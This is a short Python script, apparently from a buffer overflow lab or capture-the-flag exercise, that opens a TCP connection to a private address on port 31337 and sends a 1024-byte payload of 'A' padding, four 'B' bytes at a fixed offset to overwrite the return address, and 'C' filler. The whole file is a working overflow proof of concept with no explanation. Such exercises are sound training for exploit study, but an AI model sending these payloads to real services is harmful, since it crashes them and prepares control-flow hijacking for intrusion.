import socket
import time
ip="192.168.11.130"
port=31337


payload =  "A" * 146 + "B" *4 + "C" * (1024-150)

print "Sending %s bytes payload"%len(payload)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
s.send(payload)
s.send("\n")
